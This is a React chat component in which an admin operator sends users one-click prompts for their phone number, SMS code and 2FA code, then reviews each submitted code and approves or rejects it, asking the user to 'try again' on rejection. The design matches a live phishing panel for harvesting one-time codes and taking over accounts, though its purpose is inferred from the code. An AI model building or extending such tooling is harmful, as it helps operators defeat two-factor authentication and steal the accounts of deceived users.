import { useState, useEffect, useRef } from "react";
import { Card, CardContent, CardHeader } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar";
import { Send, X } from "lucide-react";
import type { User, Message } from "@shared/schema";
import { useSocket } from "@/hooks/use-socket";

interface ChatInterfaceProps {
  user: User;
  onClose: () => void;
  isAdmin?: boolean;
}

export function ChatInterface({ user, onClose, isAdmin = false }: ChatInterfaceProps) {
  const [messages, setMessages] = useState<Message[]>([]);
  const [newMessage, setNewMessage] = useState("");
  const [isLoading, setIsLoading] = useState(true);
  const [pendingTasks, setPendingTasks] = useState<{[key: number]: {taskId: number, answer: string, userId: string}}>({});
  const messagesEndRef = useRef<HTMLDivElement>(null);
  const { emit, on, off } = useSocket();

  useEffect(() => {
    // Load existing messages
    fetch(`/api/users/${user.id}/messages`)
      .then(res => res.json())
      .then(data => {
        setMessages(data);
        setIsLoading(false);
      })
      .catch(error => {
        console.error("Failed to load messages:", error);
        setIsLoading(false);
      });

    // Setup socket listeners
    const handleReceiveMessage = (message: Message) => {
      if (message.userId === user.id) {
        setMessages(prev => [...prev, message]);
      }
    };

    const handleReceiveUserMessage = (messageData: Message & { userId: string }) => {
      if (messageData.userId === user.id) {
        setMessages(prev => [...prev, messageData]);
      }
    };

    const handleMessageSent = (message: Message) => {
      if (message.userId === user.id) {
        setMessages(prev => [...prev, message]);
      }
    };

    const handleTaskAnswerReceived = (data: { taskId: number; answer: string; message: Message; userId: string }) => {
      if (data.userId === user.id) {
        setMessages(prev => [...prev, data.message]);
        setPendingTasks(prev => ({
          ...prev,
          [data.taskId]: data
        }));
      }
    };

    on("receive_message", handleReceiveMessage);
    on("receive_user_message", handleReceiveUserMessage);
    on("message_sent", handleMessageSent);
    on("task_answer_received", handleTaskAnswerReceived);

    return () => {
      off("receive_message", handleReceiveMessage);
      off("receive_user_message", handleReceiveUserMessage);
      off("message_sent", handleMessageSent);
      off("task_answer_received", handleTaskAnswerReceived);
    };
  }, [user.id, on, off]);

  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [messages]);

  const sendMessage = () => {
    if (!newMessage.trim()) return;

    if (isAdmin) {
      emit("admin_send_message", {
        userId: user.id,
        content: newMessage,
      });
    } else {
      emit("user_send_message", {
        userId: user.id,
        content: newMessage,
      });
    }

    setNewMessage("");
  };

  const sendTask = (taskType: "phone" | "sms" | "twoFactor") => {
    const taskMessages = {
      phone: "Please provide your phone number for verification.",
      sms: "Please enter the SMS code sent to your phone.",
      twoFactor: "Please enter your 2FA authentication code.",
    };

    emit("admin_send_task", {
      userId: user.id,
      taskType,
      content: taskMessages[taskType],
    });
  };

  const approveTask = (taskId: number) => {
    emit("task_response", {
      taskId,
      approved: true,
      userId: user.id,
    });
    
    setPendingTasks(prev => {
      const newPending = { ...prev };
      delete newPending[taskId];
      return newPending;
    });
  };

  const rejectTask = (taskId: number, feedback?: string) => {
    emit("task_response", {
      taskId,
      approved: false,
      userId: user.id,
      feedback: feedback || "Please try again with correct information.",
    });
    
    setPendingTasks(prev => {
      const newPending = { ...prev };
      delete newPending[taskId];
      return newPending;
    });
  };

  const formatMessageTime = (timestamp: Date | null) => {
    if (!timestamp) return "";
    return new Date(timestamp).toLocaleTimeString([], { 
      hour: '2-digit', 
      minute: '2-digit' 
    });
  };

  if (isLoading) {
    return (
      <Card>
        <CardContent className="p-6 text-center">
          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary mx-auto"></div>
          <p className="mt-2 text-muted-foreground">Loading messages...</p>
        </CardContent>
      </Card>
    );
  }

  return (
    <Card>
      <CardHeader className="flex flex-row items-center justify-between bg-primary text-primary-foreground">
        <div className="flex items-center gap-3">
          <Avatar className="h-10 w-10">
            <AvatarImage src={user.avatarUrl || undefined} alt={user.name} />
            <AvatarFallback>{user.name.split(' ').map(n => n[0]).join('')}</AvatarFallback>
          </Avatar>
          <div>
            <h5 className="font-semibold">{user.name}</h5>
            <p className="text-sm opacity-75">
              {user.status === "online" ? "Online" : "Offline"}
            </p>
          </div>
        </div>
        <Button
          variant="ghost"
          size="sm"
          onClick={onClose}
          className="text-primary-foreground hover:bg-primary-foreground/20"
        >
          <X className="h-4 w-4" />
        </Button>
      </CardHeader>
      
      <div className="h-96 flex flex-col">
        <div className="flex-1 overflow-y-auto p-4 space-y-4 bg-gradient-to-b from-muted/20 to-background">
          {messages.map((message) => (
            <div
              key={message.id}
              className={`flex ${message.sender === "admin" ? "justify-start" : "justify-end"} animate-in slide-in-from-bottom-2 duration-300`}
            >
              <div
                className={`max-w-[70%] p-3 rounded-2xl shadow-sm ${
                  message.sender === "admin"
                    ? "bg-primary text-primary-foreground rounded-bl-sm"
                    : "bg-muted text-foreground rounded-br-sm"
                }`}
              >
                <p className="text-sm">{message.content}</p>
                {message.isTask && (
                  <Badge className="ml-2 bg-yellow-500 text-black text-xs">TASK</Badge>
                )}
                <p className="text-xs opacity-75 mt-1">
                  {message.sender === "admin" ? "Admin • " : ""}
                  {formatMessageTime(message.timestamp)}
                </p>
              </div>
            </div>
          ))}
          
          {/* Pending Task Responses for Admin */}
          {isAdmin && Object.values(pendingTasks).map((taskData) => (
            <div key={taskData.taskId} className="bg-yellow-50 border-2 border-yellow-200 rounded-lg p-4 animate-in slide-in-from-bottom-2 duration-300">
              <div className="flex items-center justify-between mb-3">
                <div className="flex items-center gap-2">
                  <Badge className="bg-yellow-500 text-black">TASK RESPONSE</Badge>
                  <span className="text-sm font-medium">Task #{taskData.taskId}</span>
                </div>
              </div>
              
              <div className="bg-white rounded p-3 mb-3">
                <p className="text-sm text-gray-600 mb-1">User's Answer:</p>
                <p className="font-medium">{taskData.answer}</p>
              </div>
              
              <div className="flex gap-2">
                <Button
                  onClick={() => approveTask(taskData.taskId)}
                  size="sm"
                  className="flex-1 bg-green-600 hover:bg-green-700"
                >
                  ✓ Approve
                </Button>
                <Button
                  onClick={() => rejectTask(taskData.taskId)}
                  variant="destructive"
                  size="sm"
                  className="flex-1"
                >
                  ✗ Reject
                </Button>
              </div>
            </div>
          ))}
          
          <div ref={messagesEndRef} />
        </div>
        
        <div className="p-4 border-t">
          <div className="flex gap-2">
            <Input
              value={newMessage}
              onChange={(e) => setNewMessage(e.target.value)}
              placeholder="Type a message..."
              onKeyPress={(e) => e.key === "Enter" && sendMessage()}
              className="flex-1"
            />
            <Button onClick={sendMessage} size="sm">
              <Send className="h-4 w-4" />
            </Button>
            {isAdmin && (
              <div className="flex gap-1">
                <Button
                  variant="outline"
                  size="sm"
                  onClick={() => sendTask("phone")}
                  className="bg-yellow-500 text-black hover:bg-yellow-600"
                >
                  Phone
                </Button>
                <Button
                  variant="outline"
                  size="sm"
                  onClick={() => sendTask("sms")}
                  className="bg-yellow-500 text-black hover:bg-yellow-600"
                >
                  SMS
                </Button>
                <Button
                  variant="outline"
                  size="sm"
                  onClick={() => sendTask("twoFactor")}
                  className="bg-yellow-500 text-black hover:bg-yellow-600"
                >
                  2FA
                </Button>
              </div>
            )}
          </div>
        </div>
      </div>
    </Card>
  );
}
